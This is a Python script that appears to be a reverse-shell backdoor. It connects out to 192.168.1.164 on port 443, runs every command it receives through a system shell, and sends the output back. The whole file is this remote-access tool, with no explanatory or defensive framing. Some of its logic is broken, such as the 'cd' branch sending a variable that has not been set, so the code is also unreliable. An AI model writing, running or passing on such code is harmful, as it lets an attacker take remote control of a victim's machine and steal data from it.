#!/usr/bin/env python3

import socket
import subprocess
import re
import tempfile
import os

    


def run_command(command):
    command_output=subprocess.check_output(command, shell=True)
    return command_output.decode("cp850")


if  __name__=='__main__':
    client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client_socket.connect(("192.168.1.164",443))

    while True:
        command= client_socket.recv(1024).decode().strip()
        try:
            if "cd" in command.split():
                command=re.sub("cd","",command).strip()
                os.chdir(command.split()[0])
                client_socket.send(command_output)
            else:
                command_output= run_command(command)
        except:
            try:
                command_output=b"\n\n"
                client_socket.send(command_output)
            except:
                client_socket.send(f"[+] Command {command} failed")
        try:
            client_socket.send(b"\n" + command_output.encode() + b"\n")
        except:
            pass
    client_socket.close()
